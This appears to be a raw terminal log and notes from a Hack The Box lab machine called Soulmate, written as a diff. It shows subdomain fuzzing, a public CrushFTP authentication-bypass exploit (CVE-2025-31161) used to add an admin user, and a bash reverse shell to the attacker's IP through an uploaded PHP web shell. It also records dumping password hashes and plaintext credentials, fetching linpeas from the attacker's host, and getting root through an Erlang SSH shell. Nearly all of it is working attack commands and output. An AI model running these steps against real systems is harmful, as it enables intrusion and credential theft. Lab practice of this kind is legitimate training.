@@ -1,0 +1,203 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+      -u http://soulmate.htb/ -H "Host: FUZZ.soulmate.htb" \
+      --hc 404 --hh 154
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://soulmate.htb/
+Total requests: 114442
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000003:   302        0 L      0 W        0 Ch        "ftp"       
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nikto -h http://ftp.soulmate.htb    
+
++ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, PUT, POST, COPY, PROPFIND, DELETE, LOCK, MKCOL, MOVE, PROPPATCH, UNLOCK, ACL, TRACE .
++ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
++ OPTIONS: WebDAV enabled (LOCK COPY UNLOCK PROPFIND PROPPATCH MKCOL listed as allowed).
+
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -p 80,443 --script http-webdav-scan -Pn ftp.soulmate.htb
+
+PORT    STATE  SERVICE
+80/tcp  open   http
+| http-webdav-scan: 
+|   Allowed Methods: GET, HEAD, OPTIONS, PUT, POST, COPY, PROPFIND, DELETE, LOCK, MKCOL, MOVE, PROPPATCH, UNLOCK, ACL, TRACE
+|   WebDAV type: Apache DAV
+|   Server Date: Mon, 13 Oct 2025 12:36:07 GMT
+|_  Server Type: nginx/1.18.0 (Ubuntu)
+
+
+unauthorized, these dont work.
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit crushftp
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+CrushFTP 11.3.1 - Authentication Bypass                                            | multiple/remote/52295.py
+CrushFTP 7.2.0 - Multiple Vulnerabilities                                          | multiple/webapps/36126.txt
+CrushFTP < 11.1.0 - Directory Traversal                                            | multiple/remote/52012.py
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 52295.py --target ftp.soulmate.htb --port 80 --exploit --new-user tony --password P@ssw0rd
+
+[36m
+  / ____/______  _______/ /_  / ____/ /_____
+ / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
+/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
+\____/_/   \__,_/____/_/ /_/_/    \__/ .___/
+                                    /_/
+[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
+[0m
+
+Exploiting 1 targets with 10 threads...
+[+] Successfully created user tony on ftp.soulmate.htb
+Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00
+
+Exploitation complete! Successfully exploited 1/1 targets.
+
+Exploited Targets:
+→ ftp.soulmate.htb
+
+Summary:
+Total targets: 1
+Vulnerable targets: 0
+Exploited targets: 1
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+once logged in as admin we see that a user ben has access to the website
+
+we change his password and log in.
+
+
+
+
+http://soulmate.htb/prettyshell.php
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443            
+listening on [any] 443 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.86] 42430
+bash: cannot set terminal process group (1101): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@soulmate:~/soulmate.htb/public$ 
+
+
+www-data@soulmate:~/soulmate.htb/data$ cat soulmate.db
+�P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�8�OtableusersusersCREATE TABLE users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT UNIQUE NOT NULL,
+            password TEXT NOT NULL,
+            is_admin INTEGER DEFAULT 0,
+            name TEXT,
+            bio TEXT,
+            interests TEXT,
+            phone TEXT,
+            profile_pic TEXT,
+            last_login DATETIME,
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+�||�    '33admin$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2Administrator2025-08-10 13:00:082025-08-10 12:59:39
+���     userswww-data@soulmate:~/soulmate.htb/data$ 
+
+
+www-data@soulmate:~/soulmate.htb/config$ cat config.php
+
+            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 80 --directory /usr/share/peass/linpeas/                                   
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.86 - - [13/Oct/2025 09:23:48] "GET /linpeas.sh HTTP/1.1" 200 -
+
+
+www-data@soulmate:/tmp$ chmod +x linpeas.sh
+www-data@soulmate:/tmp$ ./linpeas.sh
+
+
+
+
+...
+root         863  0.0  0.2 317960 11996 ?        Ssl  11:17   0:00 /usr/sbin/ModemManager
+root        1095  0.0  1.7 2254652 69468 ?       Ssl  11:17   0:04 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
+root        1156  0.0  0.0   2784   920 ?        Ss   11:17   0:00  _ erl_child_setup 1024
+root        1099  0.0  0.0   6896  2828 ?        Ss   11:17   0:00 /usr/sbin/cron -f -P
+...
+monkey business
+
+
+
+www-data@soulmate:/tmp$ cat /usr/share/openssh/sshd_config
+
+        {user_passwords, [{"ben", "HouseH0ldings998"}]},
+        {idle_time, infinity},
+
+ben@soulmate:~$ ssh -p 2222 ben@localhost
+ben@localhost's password: 
+Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
+(ssh_runner@soulmate)1> m(os)
+                        .
+Module: os
+MD5: 594e9e9b7ffbf8b367e6cdc48f1e88e1
+Object file: /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
+Compiler options:  [debug_info,
+                    {i,"/buildroot/otp/lib/kernel/src/../include"},
+                    warn_missing_doc_function,warn_missing_doc_callback,
+                    warn_missing_spec_documented]
+Exports: 
+cmd/1                         module_info/1
+cmd/2                         perf_counter/1
+env/0                         perf_counter/0
+find_executable/1             putenv/2
+find_executable/2             set_signal/2
+getenv/0                      system_time/1
+getenv/2                      system_time/0
+getenv/1                      timestamp/0
+getpid/0                      type/0
+internal_init_cmd_shell/0     unsetenv/1
+module_info/0                 version/0
+ok
+(ssh_runner@soulmate)2> os:cmd('cat /root/root.txt').
+"4e9087769c420b79a2f68dc2372fa8ba\n"
+
+
+
+
+
+
+
+
+
